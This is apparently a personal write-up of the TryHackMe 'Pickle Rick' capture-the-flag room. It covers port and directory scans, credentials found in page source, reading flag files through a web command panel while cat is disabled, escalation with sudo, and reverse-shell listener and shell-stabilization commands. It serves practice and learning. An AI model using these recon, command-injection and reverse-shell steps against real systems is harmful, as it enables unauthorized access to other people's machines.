# TryHackMe Pickle Rick -CTF

## Local machine info:
- IP: 10.10.36.232

## Target info:
- IP: 10.10.179.14 
- Ubuntu x64
- Open ports: 
  - 22 (ssh) 
  - 80 (http) Apache httpd 2.4.18
- Found endpoints: 
  - /assets
  - /server-status
  - /login.php
  - /robots.txt --> Wubbalubbadubdub
  - /clue.txt --> "Look around the file system for the other ingredient"
  - portal.php
  - denied.php

## Flags:

- mr. meeseek hair
- 

## Credentials

- username: R1ckRul3s
- password: Wubbalubbadubdub

## Steps taken:

- nmap scan: <code>nmap -vv -sV 10.10.179.14</code>
  - Discovered open ports 22 and 80

- gobuster scans: 
  - <code>gobuster dir -u http://10.10.179.14 -w ../../usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
  - <code>gobuster dir -u http://10.10.179.14 -w ../../usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt</code>
    - Found /clue.txt and /robots.txt, which had only the word 'Wubbalubbadubdub' (Possible password...)
    - In hindsight, running gobuster with -x php,txt would have revealed the robots.txt, clue.txt, login.php, portal.php and denied.php page. 

- Look through page source:
  - Found commented username: R1ckRul3s

- nikto scan: <code>nikto -Display 1234EP -o nikto-results.txt -Format txt -Tuning 123bde -host 10.10.179.14</code>
  - Found a login page: /login.php
  - Login successful with credentials R1ckRul3s : Wubbalubbadubdub

- Successful login revealed a command panel at /portal.php
  - ls reveals contents of the current directory, including Sup3rS3cretPickl3Ingred.txt. Trying to cat the contents displays error saying command is disabled etc. --> downloaded the file with:
    - <code>wget http://10.10.179.14/Sup3rS3cretPickl3Ingred.txt</code>
    
    and read the first ingredient: **mr. meeseek hair**. Could have also used some of the following (*From John Hammond write-up video*):
      - <code>while read line; do echo $line; done < Sup3rS3cretPickl3Ingred.txt</code>
      - <code>grep . Sup3rS3cretPickl3Ingred.txt</code>
  - Second ingredient can be found by exploring the file system and discovering the hidden file at /home/rick/.second ingredient. Since cat is disabled, we can use:

    -<code>less /home/rick/"second ingredient"</code>
    
    to see the contents. Quotations are needed because the filename has a space (without quotations less tries to interpret the second word as a flag)
  - The last one can be found from /root -folder, but the default user can't read the contents. Checking user priviledges with <code>sudo -l</code> shows that we can, however, execute any command on the server. And so <code>sudo ls -la /root/</code> shows the final file "3rd.txt", and <code>sudo less /root/3rd.txt</code> can be used to view the contents. 

- Instead of using the UI command tool, a reverse shell could have been spawned by (*From John Hammond write-up video*):
  - First checking if python3 is installed on the box and executing python commands is possible with <code>python3 -c "print('hello)"</code>
  - Setting up a listener: <code>nc -lvnp 1234</code>
  - Executing (for example) the pentest monkeys python reverse shell in the UI command line
  - Stabilizing the default nc shell with: 
    - <code>python3 -c "import pty; pty.spawn('/bin/bash')"</code>
    - <code>ctrl + Z</code>
    - <code>stty raw -echo</code>
    - <code>fg</code>
    - <code>export TERM=xterm</code>
 